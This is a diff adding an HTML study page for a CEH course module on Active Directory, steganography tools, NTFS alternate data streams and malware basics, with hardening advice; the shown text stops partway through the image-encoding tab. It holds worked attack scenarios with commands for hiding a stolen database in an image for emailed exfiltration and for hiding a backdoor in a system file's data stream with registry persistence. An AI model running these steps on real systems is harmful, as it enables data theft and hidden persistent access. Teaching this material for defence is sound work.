@@ -1,0 +1,2631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>7_CEH - Active Directory, Advanced Steganography & Malware</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <h1><span class="gradient-text">7_CEH</span></h1>
+            <p>Active Directory, Advanced Steganography & Malware Architecture</p>
+        </div>
+    </header>
+
+    <!-- Navigation Breadcrumb -->
+    <nav class="breadcrumb">
+        <span class="breadcrumb-item">7_CEH</span>
+        <span class="breadcrumb-separator">›</span>
+        <span class="breadcrumb-current" id="breadcrumb-current">Overview</span>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-section">
+                <h3>Active Directory</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab1')">Overview</a></li>
+                    <li><a href="#" onclick="switchTab('tab2')">Domain Controllers</a></li>
+                    <li><a href="#" onclick="switchTab('tab3')">AD Architecture</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Advanced Stego</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab4')">Steghide Deep Dive</a></li>
+                    <li><a href="#" onclick="switchTab('tab5')">OutGuess Tool</a></li>
+                    <li><a href="#" onclick="switchTab('tab6')">NTFS ADS</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Covert Techniques</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab7')">White Space Stego</a></li>
+                    <li><a href="#" onclick="switchTab('tab8')">Image Encoding</a></li>
+                    <li><a href="#" onclick="switchTab('tab9')">Detection Methods</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Malware Basics</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab10')">Malware Types</a></li>
+                    <li><a href="#" onclick="switchTab('tab11')">Delivery Methods</a></li>
+                    <li><a href="#" onclick="switchTab('tab12')">Attack Vectors</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Advanced Cryptography</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab9b')">Crypto Foundations</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Authentication Deep Dive</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab14b')">Kerberos Protocol</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Incident Response</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab15b')">APT Attack Chains</a></li>
+                    <li><a href="#" onclick="switchTab('tab15c')">Forensics & Analysis</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Defense & Summary</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab16')">Defense Strategy</a></li>
+                    <li><a href="#" onclick="switchTab('tab17')">Endpoint Hardening</a></li>
+                    <li><a href="#" onclick="switchTab('tab18')">Summary & Quiz</a></li>
+                </ul>
+            </div>
+
+            <div class="scroll-to-top" onclick="scrollToTop()">↑ Top</div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="content">
+            <!-- Tab 1: Overview -->
+            <section class="tab-content active" id="tab1">
+                <h2>Module 7: Enterprise Security & Malware Fundamentals</h2>
+                <p class="subtitle">Active Directory, advanced steganography, and malware architecture overview</p>
+                
+                <div class="info-card">
+                    <h3>Module Learning Objectives</h3>
+                    <ul>
+                        <li><strong>Enterprise Infrastructure:</strong> Active Directory & domain controller concepts</li>
+                        <li><strong>Advanced Steganography:</strong> File hiding, NTFS streams, encoding techniques</li>
+                        <li><strong>Malware Architecture:</strong> Types, distribution, and persistence mechanisms</li>
+                        <li><strong>Threat Modeling:</strong> APT, RAT, Trojan analysis and indicators</li>
+                        <li><strong>Defense Mechanisms:</strong> Detection, hardening, and incident response</li>
+                    </ul>
+                </div>
+
+                <div class="threat-spectrum">
+                    <h3>Security Progression: Infrastructure to Malware</h3>
+                    <div class="spectrum-visual">
+                        <div class="spectrum-item" data-threat="Low">AD Auth</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Medium">Data Hiding</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="High">Malware Entry</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Critical">APT/RAT Control</div>
+                    </div>
+                </div>
+
+                <div class="learning-path">
+                    <h3>Learning Path</h3>
+                    <div class="path-timeline">
+                        <div class="path-item">AD Basics</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">DC Security</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Stego Tech</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Malware Type</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Delivery</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Defense</div>
+                    </div>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Key Concepts</h3>
+                    <ul>
+                        <li><strong>Centralized Authentication:</strong> Active Directory manages domain-wide user credentials</li>
+                        <li><strong>Covert Data Transfer:</strong> Steganography hides malware and data exfiltration</li>
+                        <li><strong>Malware Propagation:</strong> Multiple vectors deliver infection to endpoints</li>
+                        <li><strong>Command & Control:</strong> RAT/APT maintains persistent attacker access</li>
+                        <li><strong>Defense Layers:</strong> Multiple detection methods required for comprehensive security</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ Module Focus:</strong> This module bridges enterprise infrastructure security with advanced attack techniques, providing comprehensive understanding of how organizations are targeted and compromised.
+                </div>
+            </section>
+
+            <!-- Tab 2: Domain Controllers -->
+            <section class="tab-content" id="tab2">
+                <h2>Domain Controllers & Active Directory</h2>
+                <p class="subtitle">Understanding centralized authentication and user management</p>
+
+                <div class="concept-box">
+                    <h3>What is a Domain Controller?</h3>
+                    <p><strong>Domain Controller (DC):</strong> Server that manages user authentication and policy enforcement in a domain</p>
+                    <ul>
+                        <li><strong>Operating System:</strong> Windows Server (2016, 2019, 2022) or Linux/SAMBA</li>
+                        <li><strong>Primary Role:</strong> Authenticate users and enforce group policies</li>
+                        <li><strong>Centralized Database:</strong> SAM file equivalent for entire organization</li>
+                        <li><strong>Authorization:</strong> Determines what users can access and do</li>
+                        <li><strong>Replication:</strong> Multiple DCs replicate data for redundancy</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Individual Machine vs Domain Environment</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Standalone Machine</th>
+                                <th>Domain Environment</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>User Storage</strong></td>
+                                <td>Local SAM file on each machine</td>
+                                <td>Centralized Active Directory</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Authentication</strong></td>
+                                <td>Local computer validates credentials</td>
+                                <td>Domain controller authenticates</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Scalability</strong></td>
+                                <td>100+ computers = 100+ management points</td>
+                                <td>100+ computers = 1 management point</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Policy Enforcement</strong></td>
+                                <td>Manual per-machine configuration</td>
+                                <td>Group Policy applied automatically</td>
+                            </tr>
+                            <tr>
+                                <td><strong>User Experience</strong></td>
+                                <td>Login to specific computer only</td>
+                                <td>Login from any domain-joined computer</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Maintenance</strong></td>
+                                <td>Administrative nightmare at scale</td>
+                                <td>Centralized, efficient management</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Domain Login Process</h3>
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> User Initiation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>User presses Ctrl+Alt+Delete at login screen</p>
+                            <p>Enters username and password for domain</p>
+                            <p>Example: <code>DOMAIN\username</code></p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Domain Discovery
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Client machine locates domain controller via LDAP or DNS</p>
+                            <p>Sends authentication request to DC</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Credential Validation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Domain controller checks Active Directory database</p>
+                            <p>Verifies username exists and password hash matches</p>
+                            <p>Checks if user account is active (not disabled/locked)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Kerberos Token Generation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>DC generates Kerberos TGT (Ticket Granting Ticket)</p>
+                            <p>TGT encrypted with user's password hash</p>
+                            <p>User receives Kerberos session ticket</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Access Granted
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>User logged into desktop with domain credentials</p>
+                            <p>Group policies applied from domain controller</p>
+                            <p>User has access to domain resources based on group membership</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Group Policy Application</h3>
+                    <p><strong>Group Policy Object (GPO):</strong> Configuration template applied to users/machines</p>
+                    <ul>
+                        <li><strong>Password Policies:</strong> Complexity, age, history requirements</li>
+                        <li><strong>Desktop Restrictions:</strong> Disable wallpaper changes, screen saver settings</li>
+                        <li><strong>Application Control:</strong> Whitelist allowed applications, prevent installations</li>
+                        <li><strong>Security Policies:</strong> Audit settings, firewall rules, encryption requirements</li>
+                        <li><strong>Automatic Updates:</strong> Force Windows Update patches on schedule</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 3: AD Architecture & Security -->
+            <section class="tab-content" id="tab3">
+                <h2>Active Directory Architecture & Security Implications</h2>
+                <p class="subtitle">Understanding AD structure and attack surface</p>
+
+                <div class="info-card">
+                    <h3>Active Directory Components</h3>
+                    <ul>
+                        <li><strong>Forest:</strong> Top-level organizational unit (usually one per organization)</li>
+                        <li><strong>Domain:</strong> Security boundary within forest (user auth, policy enforcement)</li>
+                        <li><strong>Organizational Units (OUs):</strong> Containers for users/computers with specific policies</li>
+                        <li><strong>Global Catalog:</strong> Searchable index of all AD objects</li>
+                        <li><strong>Schema:</strong> Defines object types and attributes</li>
+                        <li><strong>Replication:</strong> Changes replicated between domain controllers</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 AD ATTACK SURFACE:</strong>
+                    <ul>
+                        <li><strong>Kerberos Attacks:</strong> TGT hijacking, pass-the-ticket, credential stuffing</li>
+                        <li><strong>LDAP Enumeration:</strong> Extract user list, group memberships, admin accounts</li>
+                        <li><strong>Domain Admin Account:</strong> If compromised → entire forest compromised</li>
+                        <li><strong>Unpatched Servers:</strong> Zero-day exploits on legacy domain controllers</li>
+                        <li><strong>GPO Abuse:</strong> Weaponized group policies distribute malware domain-wide</li>
+                        <li><strong>Golden Ticket:</strong> Forged Kerberos ticket with Domain Admin privileges</li>
+                    </ul>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Active Directory Security Hardening</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>User & Account Security</h4>
+                        <ul>
+                            <li>Enforce strong passwords (20+ characters, complexity enabled)</li>
+                            <li>Multi-factor authentication (MFA) for all user accounts</li>
+                            <li>Limit administrative account usage (no daily use with admin privs)</li>
+                            <li>Implement Just-In-Time (JIT) admin access</li>
+                            <li>Monitor domain admin account usage in real-time</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Domain Controller Protection</h4>
+                        <ul>
+                            <li>Isolate DCs on separate network segment</li>
+                            <li>Restrict DC access to authorized administrators only</li>
+                            <li>Enable DC replication signing and sealing</li>
+                            <li>Regularly back up AD database</li>
+                            <li>Apply latest security patches immediately</li>
+                            <li>Disable anonymous LDAP queries</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Monitoring & Detection</h4>
+                        <ul>
+                            <li>Monitor Kerberos ticket requests for anomalies</li>
+                            <li>Alert on failed authentication attempts (threshold: 5+)</li>
+                            <li>Track privileged account usage and access</li>
+                            <li>Enable AD audit logging (directory service access, account management)</li>
+                            <li>Use SIEM to centralize and correlate AD events</li>
+                            <li>Monitor for DCSync attacks (credential replication)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 4: Steghide Deep Dive -->
+            <section class="tab-content" id="tab4">
+                <h2>Steghide: Enterprise-Grade File Hiding</h2>
+                <p class="subtitle">Advanced steganography tool for professional data concealment</p>
+
+                <div class="concept-box">
+                    <h3>Steghide Capabilities</h3>
+                    <ul>
+                        <li><strong>Supported Formats:</strong> JPEG, BMP, WAV, AU (audio), FLAC</li>
+                        <li><strong>Encryption:</strong> Rijndael-128 encryption built-in (not just compression)</li>
+                        <li><strong>Passphrase Protection:</strong> Secures hidden data with password</li>
+                        <li><strong>Compression:</strong> Automatic compression reduces file size</li>
+                        <li><strong>Stealth:</strong> Changes imperceptible to human eye/ear</li>
+                        <li><strong>Capacity:</strong> Up to 20-30% of carrier file can be hidden</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Steghide Command Syntax & Examples</h3>
+                    <pre><code># EMBEDDING SECRET DATA INTO IMAGE
+steghide embed -cf cover.jpg -ef secret.txt -p "passphrase"
+# -cf: Cover File (carrier/image)
+# -ef: Embed File (hidden file)
+# -p: Passphrase (encryption key)
+
+# EXTRACTING HIDDEN DATA FROM IMAGE
+steghide extract -sf stego.jpg -p "passphrase"
+# -sf: Stego File (image with hidden data)
+# Extracts secret.txt automatically
+
+# GET INFORMATION ABOUT STEGO FILE
+steghide info stego.jpg
+# Shows capacity, estimated hidden data size
+
+# EMBED WITHOUT EXTENSION (HIDE FILE TYPE)
+steghide embed -cf photo.jpg -ef database.zip -p "secret123" -sf output.jpg
+
+# FORCE OVERWRITE EXISTING OUTPUT
+steghide embed -cf image.jpg -ef confidential.doc -p "pass" -f
+
+# BATCH PROCESSING MULTIPLE FILES
+for file in *.txt; do
+  steghide embed -cf base_image.jpg -ef "$file" -p "password" -sf "${file}.stego.jpg"
+done</code></pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Data Exfiltration with Steghide</h3>
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Scenario:</span> Stealing Database
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Objective:</strong> Steal 100MB customer database without detection</p>
+                            <p><strong>Challenge:</strong> Email attachment filter blocks files >50MB</p>
+                            <p><strong>Solution:</strong> Compress and hide in legitimate image</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Prepare Data
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>zip -9 database_backup.zip /path/to/database
+# Result: 100MB → 35MB compressed</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Obtain Carrier Image
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>wget https://www.example.com/vacation_photo.jpg
+# Download high-resolution image (60MB)
+# Steghide capacity: ~15-20MB (sufficient)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Hide Data
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>steghide embed -cf vacation_photo.jpg \
+  -ef database_backup.zip -p "C0mpl3xP@ssw0rd" \
+  -sf business_trip_photos.jpg</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Send Innocuously
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Email: "vacation photos from NYC trip"</p>
+                            <p>Attachment: business_trip_photos.jpg (60MB)</p>
+                            <p>Content filter analysis: Legitimate JPG image ✓</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Extract at Destination
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>steghide extract -sf business_trip_photos.jpg \
+  -p "C0mpl3xP@ssw0rd"
+# Recovers: database_backup.zip
+unzip database_backup.zip
+# Full database restored successfully</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Detection Challenges</h3>
+                    <ul>
+                        <li><strong>No Visual Differences:</strong> Image appears identical to naked eye</li>
+                        <li><strong>File Size:</strong> Can appear normal (steghide adds minimal overhead)</li>
+                        <li><strong>Metadata Preserved:</strong> EXIF data remains unmodified</li>
+                        <li><strong>Custom Passphrase:</strong> Only sender/recipient knows encryption key</li>
+                        <li><strong>Advanced Detection:</strong> Statistical analysis required (chi-square test, entropy)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 5: OutGuess Tool -->
+            <section class="tab-content" id="tab5">
+                <h2>OutGuess: DCT-Based Steganography</h2>
+                <p class="subtitle">Advanced JPEG steganography using DCT coefficient manipulation</p>
+
+                <div class="concept-box">
+                    <h3>OutGuess vs Steghide</h3>
+                    <p><strong>Key Difference:</strong> OutGuess modifies JPEG DCT (Discrete Cosine Transform) coefficients directly</p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Steghide</th>
+                                <th>OutGuess</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Primary Format</td>
+                                <td>Universal (JPEG, WAV, BMP)</td>
+                                <td>JPEG optimized</td>
+                            </tr>
+                            <tr>
+                                <td>Technique</td>
+                                <td>LSB substitution</td>
+                                <td>DCT coefficient modification</td>
+                            </tr>
+                            <tr>
+                                <td>Encryption</td>
+                                <td>Rijndael-128 included</td>
+                                <td>Optional password</td>
+                            </tr>
+                            <tr>
+                                <td>Detection Resistance</td>
+                                <td>Good</td>
+                                <td>Very Good (harder to detect)</td>
+                            </tr>
+                            <tr>
+                                <td>Capacity</td>
+                                <td>20-30%</td>
+                                <td>15-25% (but more secure)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h3>OutGuess Usage Examples</h3>
+                    <pre><code># BASIC EMBEDDING
+outguess -e -d secret.txt original.jpg stego.jpg
+# -e: Embed mode
+# -d: Data file to hide
+# Result: stego.jpg contains hidden data
+
+# BASIC EXTRACTION
+outguess -r -d recovered.txt stego.jpg
+# -r: Read/extract mode
+# Recovers hidden data to recovered.txt
+
+# WITH ENCRYPTION/PASSWORD
+outguess -e -p "MyPassword123" -d secret.txt original.jpg stego.jpg
+outguess -r -p "MyPassword123" -d recovered.txt stego.jpg
+
+# GET FORMAT INFORMATION
+outguess -i stego.jpg
+# Shows capacity, compression quality, DCT information
+
+# QUALITY/COMPRESSION OPTIONS
+outguess -e -q 75 -d secret.txt original.jpg stego.jpg
+# -q: JPEG quality (higher = less distortion but larger file)</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>OutGuess vs Steghide Practical Comparison</h3>
+                    <ul>
+                        <li><strong>Steghide:</strong> Better for multi-format deployment, easier to use</li>
+                        <li><strong>OutGuess:</strong> Better for JPEG-specific scenarios, more resistant to detection</li>
+                        <li><strong>Detection Difficulty:</strong> OutGuess slightly harder to detect statistically</li>
+                        <li><strong>Speed:</strong> Both comparable, OutGuess slightly faster</li>
+                        <li><strong>Capacity:</strong> Similar, depends on image size and compression</li>
+                        <li><strong>Recommendation:</strong> Use OutGuess for critical data, Steghide for convenience</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 6: NTFS Alternate Data Streams -->
+            <section class="tab-content" id="tab6">
+                <h2>NTFS Alternate Data Streams (ADS)</h2>
+                <p class="subtitle">Hiding files within files on Windows systems</p>
+
+                <div class="concept-box">
+                    <h3>What are Alternate Data Streams?</h3>
+                    <p><strong>NTFS ADS:</strong> Hidden file forks that allow multiple data streams in single file</p>
+                    <ul>
+                        <li><strong>Invisible by Default:</strong> Normal tools don't show ADS</li>
+                        <li><strong>Data Retention:</strong> ADS survives file copying (within NTFS)</li>
+                        <li><strong>Capacity:</strong> Unlimited (theoretically, limited by disk space)</li>
+                        <li><strong>Attribution:</strong> Malware hiding technique, not immediately obvious</li>
+                        <li><strong>Original File Unaffected:</strong> Can't tell main file contains stream data</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>NTFS ADS Creation & Extraction</h3>
+                    <pre><code># HIDE TEXT MESSAGE IN FILE
+echo "Welcome to the college" > readme.txt:secret.txt
+# Main file: readme.txt (contains original content)
+# Hidden stream: secret.txt (invisible)
+
+# VIEW MAIN FILE CONTENT
+type readme.txt
+# Output: Only shows main stream content
+# Hidden stream NOT visible
+
+# VIEW HIDDEN STREAM
+type readme.txt:secret.txt
+# Output: "Welcome to the college"
+
+# CREATE HIDDEN EXECUTABLE
+copy malware.exe readme.txt:evil.exe
+# readme.txt appears normal (original size)
+# evil.exe hidden in alternate stream
+
+# HIDE ENTIRE DIRECTORY IN STREAM
+dir C:\Confidential > readme.txt:folder_list.txt
+# Directory listing hidden in stream
+
+# LIST ALL STREAMS (WINDOWS)
+dir /R readme.txt
+# Shows main stream and all hidden streams
+
+# DETECT STREAMS WITH TOOLS
+dir /R
+# Built-in Windows command (streams visible as)
+# readme.txt:secret.txt:$DATA
+
+# REMOVE HIDDEN STREAM
+type readme.txt > temp.txt && del readme.txt && ren temp.txt readme.txt
+# Deletes all alternate streams (copies main stream only)</code></pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>NTFS ADS Attack Scenario: Backdoor Installation</h3>
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Objective:</span> Hide Backdoor
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Attacker has command execution on Windows system</p>
+                            <p>Wants to hide backdoor executable where it won't be detected</p>
+                            <p>Standard folders (System32, Program Files) monitored</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Upload Malware
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>C:\> backdoor.exe (100KB file)
+# Attacker uploads via file upload vulnerability</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Hide in Stream
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>copy C:\Windows\System32\notepad.exe C:\Windows\System32\notepad.exe:hidden.exe
+copy backdoor.exe C:\Windows\System32\notepad.exe:hidden.exe
+# Hidden in legitimate system file</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Create Persistence
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
+  /v "Update" /t REG_SZ /d "notepad.exe:hidden.exe"
+# Registry entry executes hidden backdoor on next reboot</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Deletion & Cleanup
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>del backdoor.exe
+# Original file deleted
+# notepad.exe appears normal size (~200KB)
+# Hidden stream not visible to administrators</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Persistence Achieved
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>On system reboot: notepad.exe:hidden.exe executes automatically</p>
+                            <p>Backdoor connects to C&C server for remote access</p>
+                            <p>Administrator runs dir/type commands - sees nothing unusual</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 NTFS ADS RISKS:</strong>
+                    <ul>
+                        <li>Malware hiding and execution without visibility</li>
+                        <li>Rootkit installation in hidden streams</li>
+                        <li>Backdoor persistence mechanisms</li>
+                        <li>Worm propagation through network shares</li>
+                        <li>Data theft - databases hidden in system files</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ DETECTION & REMOVAL:</strong> Use Streams tool, dir /R command, or PowerShell: (Get-Item "file.txt" -Stream *)
+                </div>
+            </section>
+
+            <!-- Tab 7: White Space Steganography -->
+            <section class="tab-content" id="tab7">
+                <h2>White Space Steganography</h2>
+                <p class="subtitle">Hiding data in text file spacing and invisible characters</p>
+
+                <div class="concept-box">
+                    <h3>White Space Stego Basics</h3>
+                    <p><strong>Principle:</strong> Embed data in invisible characters (spaces, tabs, newlines)</p>
+                    <ul>
+                        <li><strong>Target:</strong> Text files, documents, source code</li>
+                        <li><strong>Invisible:</strong> When viewed normally, document appears unchanged</li>
+                        <li><strong>Encoding:</strong> Each space/tab represents 1 bit (space=0, tab=1)</li>
+                        <li><strong>Detection:</strong> Select-all (Ctrl+A) reveals extra whitespace</li>
+                        <li><strong>Tools:</strong> Snow, SNOW32.exe (Windows implementation)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>White Space Steganography with SNOW</h3>
+                    <pre><code># HIDE SECRET MESSAGE IN TEXT FILE
+snow -C -m "This is secret information" -p "password123" input.txt output.txt
+# -C: Compress the message
+# -m: Message to hide
+# -p: Passphrase protection
+# Result: output.txt has hidden message in whitespace
+
+# EXTRACT HIDDEN MESSAGE
+snow -C -p "password123" output.txt
+# Output: "This is secret information"
+# Only valid with correct passphrase
+
+# ADVANCED: HIDE ENTIRE FILE IN DOCUMENT
+snow -C -f secret.zip -p "pass456" cover.txt output.txt
+# Embeds entire ZIP file in document whitespace
+
+# ESTIMATE CAPACITY
+snow -c cover.txt
+# Shows how much data can be embedded
+
+# BATCH PROCESS FILES
+for file in *.txt; do
+  snow -C -m "Tagged by XYZ" -p "shared_key" "$file" "${file}.stego"
+done</code></pre>
+                </div>
+
+                <div class="theory-card">
+                    <h3>White Space Detection Methods</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Detection Method</th>
+                                <th>Effectiveness</th>
+                                <th>Effort Required</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Visual Inspection (Select-All)</td>
+                                <td>Low (only obvious cases)</td>
+                                <td>Minimal</td>
+                            </tr>
+                            <tr>
+                                <td>Entropy Analysis</td>
+                                <td>Medium (statistical)</td>
+                                <td>Moderate (scripting)</td>
+                            </tr>
+                            <tr>
+                                <td>Forensic Tool Scanning</td>
+                                <td>High (dedicated tools)</td>
+                                <td>Moderate (tool setup)</td>
+                            </tr>
+                            <tr>
+                                <td>Byte-Level Analysis</td>
+                                <td>Very High (definitive)</td>
+                                <td>High (manual review)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Practical Applications</h3>
+                    <ul>
+                        <li><strong>Insider Threat:</strong> Employee hides confidential documents in email messages</li>
+                        <li><strong>C&C Communication:</strong> Attacker hides commands in public documents/comments</li>
+                        <li><strong>Data Exfiltration:</strong> Hidden metadata in source code commits</li>
+                        <li><strong>Supply Chain Attack:</strong> Malicious payload embedded in software documentation</li>
+                        <li><strong>Plausible Deniability:</strong> Sender claims document is unmodified</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 8: Image Encoding -->
+            <section class="tab-content" id="tab8">
+                <h2>Image Encoding for Data Exfiltration</h2>
+                <p class="subtitle">Converting sensitive data to base64/encoded formats in images</p>
+
+                <div class="concept-box">
+                    <h3>Image Encoding Techniques</h3>
+                    <ul>
+                        <li><strong>Base64 Encoding:</strong> Convert binary to ASCII text (50% size increase)</li>
+                        <li><strong>Hexadecimal:</strong> Convert to hex format (double size)</li>
+                        <li><strong>LSB Replacement:</strong> Embed data in least significant bits</li>
+                        <li><strong>Metadata Injection:</strong> Hide data in EXIF, IPTC, XMP fields</li>
+                        <li><strong>Polyglot Files:</strong> Create files valid as both JPG and data</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Base64 Image Data Encoding</h3>
+                    <pre><code># ENCODE FILE TO BASE64 FOR EMBEDDING
+base64 confidential.pdf > encoded.txt
+# Result: Text-based representation of binary file
+
+# EMBED IN IMAGE METADATA
+exiftool -Comment="$(cat encoded.txt)" photo.jpg output.jpg
